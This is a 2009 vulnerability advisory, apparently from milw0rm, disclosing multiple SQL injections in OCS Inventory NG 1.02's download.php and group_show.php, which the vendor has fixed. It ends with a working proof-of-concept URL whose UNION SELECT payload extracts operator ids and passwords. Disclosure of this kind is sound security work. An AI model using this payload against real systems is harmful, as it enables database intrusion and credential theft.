@@ -1,0 +1,46 @@
+OCS Inventory NG - Multiple SQL Injections (May 30 2009)
+_______________________________________________________________________________
+
+
+* Product
+
+  Open Computer and Software (OCS) Inventory NG
+  (http://www.ocsinventory-ng.org/)
+
+* Vulnerable Versions
+
+  OCS Inventory NG 1.02 (Unix)
+
+
+* Vendor Status
+
+  Vendor has been notified and the vulnerability has been fixed.
+
+
+* Details
+
+  The Open Computer and Software (OCS) Inventory Next Generation (NG)
+provides relevant inventory information about system configurations and
+software on the network. The server can be managed using a web
+interface. It was found that the application does not properly sanitize
+user input which results into multiple SQL injections.
+
+  Affected are the following scripts:
+
+  - download.php (parameters `N', `DL', `O' and `V')
+  - group_show.php (parameter `SYSTEMID');
+
+* Impact
+
+  Attackers may be able to manipulate SQL statements in such a way that
+they can retrieve, create or modify information stored in the database.
+Furthermore, the SQL injection might allow attackers to get a foothold
+on the underlying system.
+
+* Exploit
+
+  The vulnerability can be exploited by just using a web browser:
+
+	http://example.org/ocsreports/download.php?n=1&dl=2&o=3&v=4'union+all+select+concat(id,':',passwd)+from+operators%23
+
+# milw0rm.com [2009-06-01]
